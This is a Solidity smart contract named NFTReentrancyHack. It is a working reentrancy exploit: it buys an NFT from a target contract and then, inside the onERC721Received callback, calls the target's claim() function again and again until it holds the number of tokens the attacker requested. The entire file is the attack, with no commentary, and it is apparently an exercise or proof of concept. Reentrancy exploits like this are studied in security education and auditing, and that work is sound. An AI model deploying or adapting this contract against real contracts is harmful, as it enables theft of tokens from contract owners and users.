// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

contract NFTReentrancyHack {

    address public target;
    uint8 public counter;
    uint public nbTokens;
    

    constructor(address _target){
        target = _target;
        counter=0;
    }

    function buy() external payable {
        (bool success, )  = target.call{value: msg.value}(abi.encodeWithSignature("buy()"));
        require(success, "Buying NFT FAILED"); 
    }

    function claim(uint _nbTokens) external {
        nbTokens=_nbTokens;
        (bool success, )  = target.call(abi.encodeWithSignature("claim()"));
        require(success, "Hacking claim NFT failed in claim"); 
    }
    function onERC721Received(
        address, 
        address, 
        uint256, 
        bytes calldata
    )external returns(bytes4) {
        // target.call(abi.encodeWithSignature("balanceOf(address)",addr));
        counter+=1;
        
        if(counter>=nbTokens){
            return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
        }
        (bool success, )  = target.call(abi.encodeWithSignature("claim()"));
        require(success, "Hacking claim NFT failed in onERC721Received"); 

        counter+=1;
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    } 
}
